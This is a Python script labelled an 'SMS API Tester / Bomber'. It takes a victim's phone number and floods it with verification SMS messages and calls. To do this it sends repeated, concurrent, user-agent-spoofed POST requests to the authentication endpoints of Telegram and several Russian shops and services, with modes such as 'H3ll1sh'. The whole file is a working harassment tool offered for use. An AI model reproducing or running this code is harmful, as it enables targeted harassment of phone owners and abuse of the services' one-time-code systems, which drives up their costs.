#!/home/arch/sms-tester/venv/bin/python
import requests
import time
import random
import string
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent

ua = UserAgent()

def generate_email():
    templates = [
        f'{random.randint(1,9999)}qwerty{random.randint(1,9999)}poplok{random.randint(1,9999)}',
        f'asd{random.randint(1,9999)}vdiu{random.randint(1,9999)}gv{random.randint(1,9999)}uhn',
        f'kmjnhgfds{random.randint(1,9999)}eefcx{random.randint(1,9999)}9841fd{random.randint(1,9999)}1b',
        f'{random.randint(1,9999)}rftfg{random.randint(1,9999)}xcvm{random.randint(1,9999)}7pwgs',
        f'g{random.randint(1,9999)}y{random.randint(1,9999)}u{random.randint(1,9999)}i{random.randint(1,9999)}werdf',
        f'{random.randint(1,9999)}etrdg{random.randint(1,9999)}Dxvjoj{random.randint(1,9999)}b{random.randint(1,9999)}98',
        f'poo{random.randint(1,9999)}hqazh{random.randint(1,9999)}cxbvc845vfdvfbbdfs{random.randint(1,9999)}',
        f'l{random.randint(1,9999)}h{random.randint(1,9999)}r{random.randint(1,9999)}y{random.randint(1,9999)}i{random.randint(1,9999)}f{random.randint(1,9999)}d{random.randint(1,9999)}45dfser',
        f'portdfcv{random.randint(1,9999)}CTRP{random.randint(1,9999)}458745{random.randint(1,9999)}d',
        f'wsexrctfybgu{random.randint(1,9999)}fyguhmio{random.randint(1,9999)}zwsxedcrfvgbynhu{random.randint(1,9999)}drftghuji87'
    ]
    return f'{random.choice(templates)}@gmail.com'

def slice_phone(phone):
    if len(phone) >= 12:
        return phone[2:12]
    return phone

APIS = [
    {
        "name": "My.Telegram.org", "url": "https://my.telegram.org/auth/send_password",
        "payload": {"phone": "{phone}"}, "formate": True,
        "origin": "https://my.telegram.org", "referer": "https://my.telegram.org/"
    },
    {
        "name": "VTK-Moscow", "url": "https://vtk-moscow.ru/users/",
        "payload": {"from_phone": "{phone}", "apply": "reg_apply"}, "formate": True,
        "origin": "https://vtk-moscow.ru", "referer": "https://vtk-moscow.ru/"
    },
    {
        "name": "V-Dymov", "url": "https://www.v-dymov.ru/local/include/ajax/confirmation.php",
        "payload": {"form": "login", "phone": "+{phone}"}, "formate": True,
        "origin": "https://www.v-dymov.ru", "referer": "https://www.v-dymov.ru/"
    },
    {
        "name": "Leader-ID", "url": "https://leader-id.ru/api/v4/auth/start-phone-confirm",
        "payload": {"phone": "{phone}"}, "formate": False,
        "origin": "https://leader-id.ru", "referer": "https://leader-id.ru/registration"
    },
    {
        "name": "TortoMaster", "url": "https://kaliningrad.tortomaster.ru/include/ajax/flashcall_helper.php",
        "payload": {"REGISTER[PHONE_NUMBER]": "{phone}", "send_sms": "Y", "agree": "Y"}, "formate": True,
        "origin": "https://kaliningrad.tortomaster.ru", "referer": "https://kaliningrad.tortomaster.ru/personal/?register=yes"
    },
    {
        "name": "Azbuka-Severa (CALL)", "url": "https://azbuka-severa.ru/local/ajax/get_phone_code.php",
        "payload": {"PHONE": "{phone}"}, "formate": True,
        "origin": "https://azbuka-severa.ru", "referer": "https://azbuka-severa.ru/"
    },
    {
        "name": "Shop.Hlebprom (CALL)", "url": "https://shop.hlebprom.ru/",
        "payload": {"backurl": "/", "AUTH_FORM": "Y", "TYPE": "AUTH", "USER_LOGIN": "{phone}", "PERSONAL_REG_TYPE": "phone", "Login": "true"}, "formate": True,
        "origin": "https://shop.hlebprom.ru", "referer": "https://shop.hlebprom.ru/"
    }
]

def send_request(api, phone):
    try:
        headers = {
            "Content-Type": "application/json",
            "Accept": "*/*",
            "User-Agent": ua.random,
            "Origin": api.get("origin", ""),
            "Referer": api.get("referer", "")
        }
        
        payload = {}
        for k, v in api["payload"].items():
            if isinstance(v, str):
                payload[k] = v.replace("{phone}", phone).replace("{phone_slice}", slice_phone(phone))
            else:
                payload[k] = v

        if api.get("formate"):
            r = requests.post(api["url"], data=payload, headers=headers, timeout=10)
        else:
            r = requests.post(api["url"], json=payload, headers=headers, timeout=10)

        if r.status_code in [200, 201, 202, 204]:
            print(f"  [+] OK: {api['name']} ({r.status_code})")
        else:
            print(f"  [-] FAIL: {api['name']} ({r.status_code})")
            
    except Exception as e:
        print(f"  [!] ERR: {api['name']} - {type(e).__name__}")

def run_mode(mode, phone, cycles):
    if mode == "1":
        target_apis = [a for a in APIS if "CALL" not in a["name"]]
    elif mode == "2":
        target_apis = [a for a in APIS if "CALL" in a["name"]]
    elif mode == "3":
        target_apis = APIS
    elif mode == "4":
        target_apis = APIS

    print(f"\n[*] Starting mode {mode} for {phone}")
    print(f"[*] Cycles: {cycles}. Total APIs: {len(target_apis)}\n")

    for i in range(cycles):
        print(f"--- Cycle {i+1} ---")
        with ThreadPoolExecutor(max_workers=10) as executor:
            for api in target_apis:
                executor.submit(send_request, api, phone)
        time.sleep(2)

def main():
    ascii_art = """
    ██╗  ██╗███████╗██╗     ██╗     ███████╗██╗██████╗ ███████╗
    ██║  ██║██╔════╝██║     ██║     ██╔════╝██║██╔══██╗██╔════╝
    ███████║█████╗  ██║     ██║     █████╗  ██║██████╔╝█████╗  
    ██╔══██║██╔══╝  ██║     ██║     ██╔══╝  ██║██╔══██╗██╔══╝  
    ██║  ██║███████╗███████╗███████╗██║     ██║██║  ██║███████╗
    ╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝
    [ SMS API Tester / Bomber ]
    """
    print(ascii_art)
    print("Select mode:")
    print("  1. SMS")
    print("  2. CALL")
    print("  3. Mixer")
    print("  4. H3ll1sh")
    print("  0. Exit\n")
    
    mode = input("> ")
    if mode == "0":
        return
        
    if mode not in ["1", "2", "3", "4"]:
        print("Invalid mode!")
        return

    phone = input("Enter phone number (example: 79991234567): ").strip()
    phone = "".join(filter(str.isdigit, phone))
    
    if len(phone) != 11:
        print("[!] Phone number must have 11 digits!")
        return

    try:
        cycles = int(input("Enter cycles: "))
    except ValueError:
        print("[!] Please enter a valid number!")
        return

    try:
        run_mode(mode, phone, cycles)
    except KeyboardInterrupt:
        print("\n[*] Stopped by user.")

if __name__ == "__main__":
    main()
